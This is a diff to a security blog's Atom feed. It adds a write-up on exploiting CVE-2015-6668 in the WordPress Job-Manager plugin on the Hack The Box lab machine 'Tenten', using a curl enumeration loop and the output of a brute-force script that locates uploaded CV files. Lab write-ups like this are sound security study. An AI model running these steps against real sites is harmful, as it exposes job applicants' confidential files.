@@ -4,13 +4,62 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-04-16T18:32:37+08:00</updated>
+ <updated>2022-04-17T18:05:46+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Wordpress Job-Manager Plugin File Disclosure</title>
+   <link href="https://mvineza.github.io/spindel/2022/04/17/wordpress-jobmanager-plugin-file-disclosure"/>
+   <updated>2022-04-17T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/04/17/Wordpress-JobManager-Plugin-File-Disclosure</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;Vulnerable versions of job-manager plugin can allow attacker to retrieve confidential files such as CV.&lt;/p&gt;
+
+&lt;p&gt;CVE-2015-6668&lt;/p&gt;
+
+&lt;h2 id=&quot;environment-setup&quot;&gt;Environment Setup&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Wordpress running job manager plugin 0.7.25.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Check what available are the available job titles&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1 25&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://tenten/index.php/jobs/apply/&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;/ | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;entry-title&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&amp;gt;&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f2&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Using this &lt;a href=&quot;https://github.com/1nf1n17yk1ng/CVE-2015-6668&quot;&gt;script&lt;/a&gt;, brute force the possible files you can retrieve from the uploads directory&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  exploit python2 brute.py
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;it is now deprecated &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;cryptography, and will be removed &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the next release.
+
+CVE-2015-6668
+Title: CV filename disclosure on Job-Manager WP Plugin
+Blog: https://vagmour.eu
+Plugin URL: http://www.wp-jobmanager.com
+Versions: &amp;lt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.7.25
+
+Enter a vulnerable website: http://tenten
+Enter a file name: HackerAccessGranted
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] URL of CV found! http://tenten/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+➜  exploit 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;HTB Tenten&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>LD_PRELOAD</title>
